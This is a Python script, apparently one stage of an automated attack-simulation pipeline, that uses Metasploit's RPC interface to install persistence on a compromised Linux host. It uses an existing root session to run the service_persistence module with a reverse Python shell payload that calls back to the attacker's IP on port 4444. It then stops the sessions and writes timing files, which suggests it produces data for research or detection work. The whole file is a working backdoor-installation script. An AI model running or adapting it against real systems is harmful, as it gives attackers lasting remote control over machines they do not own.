import time
import sys
import os
from pymetasploit3.msfrpc import MsfRpcClient

def record_timestamp(folder, output_time_file):
    """Record the current timestamp to a file"""
    output_time_file = os.path.join(folder, output_time_file)
    with open(output_time_file, "w+") as fw:
        fw.write('%f' % time.time())

def main(argv):
    # --- Argument Handling ---
    # Argv: 0=script, 1=folder, 2=my_ip, 3=target_ip, 4=session_id
    if len(argv) < 5:
        print("[ERROR] Missing Session ID argument.")
        print("Usage: python3 script.py <folder> <my_ip> <target_ip> <ROOT_SESSION_ID>")
        print("[WARNING] Defaulting to Session 2")
        session_to_use = '2'
    else:
        session_to_use = argv[4]

    folder = argv[1]
    my_ip = argv[2]
    target_ip = argv[3]
    
    print(f"--- [Step 4: Persistence] Establishing Persistent Access ---")
    print(f"Target: {target_ip} | Attacker: {my_ip} | Using Root Session: {session_to_use}")
    
    # Record Start Time
    output_time_file_start = 'time_step_4_start.txt'
    record_timestamp(folder, output_time_file_start)
    
    # Sleep 60s (Script Requirement)
    print("Waiting 60s (Script Requirement)...")
    time.sleep(60)

    client = MsfRpcClient('kali')
    
    try:
        # 1. Create Console
        cid = client.consoles.console().cid
        console = client.consoles.console(cid)
        print(f"Console {cid} created.")
        
        # 2. Verify Session Exists
        active_sessions = client.sessions.list
        if session_to_use not in active_sessions:
            print(f"[ERROR] Session {session_to_use} is not active. Persistence cannot be installed.")
            return
        
        print(f"[+] Session {session_to_use} verified as active.")
        
        # 3. Prepare Commands (Persistence Module)
        commands = [
            'use exploit/linux/local/service_persistence',
            f'set SESSION {session_to_use}',
            'set PAYLOAD cmd/unix/reverse_python',
            f'set LHOST {my_ip}',
            'set LPORT 4444',
            'set VERBOSE true',
            'run'
        ]

        # 4. Execute Commands
        for cmd in commands:
            console.write(cmd)
            time.sleep(0.5)

        # 5. Stream Output (Polling Loop)
        print("--- Metasploit Persistence Module Output ---")
        max_wait_time = 120
        start_time = time.time()
        
        persistence_established = False
        
        while True:
            result = console.read()
            data = result.get('data', '')
            
            if data:
                print(data, end='')
                
                # Check for success indicators
                if "Service" in data and "installed" in data:
                    print("\n[+] Persistence Service Installed Successfully.")
                    persistence_established = True
                
                # Check for completion
                if "Module execution completed" in data or "Post module execution completed" in data:
                    break
            
            if time.time() - start_time > max_wait_time:
                print("\n[!] Timeout waiting for persistence module.")
                break
            
            time.sleep(1)

        # 6. Final Status
        if persistence_established:
            print("\n[SUCCESS] Persistence mechanism successfully established.")
        else:
            print("\n[WARNING] Persistence status unclear from module output.")

        # 7. Cleanup (Optional Logic)
        print("\n[Info] Original script logic: Stopping sessions to simulate disconnection...")
        sessions_to_stop = ['1', '2', '3']
        
        for sess_id in sessions_to_stop:
            if sess_id in client.sessions.list:
                try:
                    client.sessions.session(sess_id).stop()
                    print(f"[+] Stopped session {sess_id}")
                except Exception as e:
                    print(f"[!] Could not stop session {sess_id}: {e}")

    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        if 'console' in locals():
            print(f"Destroying console {cid}...")
            console.destroy()

    # Record End Time
    output_time_file_end = 'time_step_4_end.txt'
    record_timestamp(folder, output_time_file_end)
    
    time.sleep(30)

if __name__ == "__main__":
    main(sys.argv)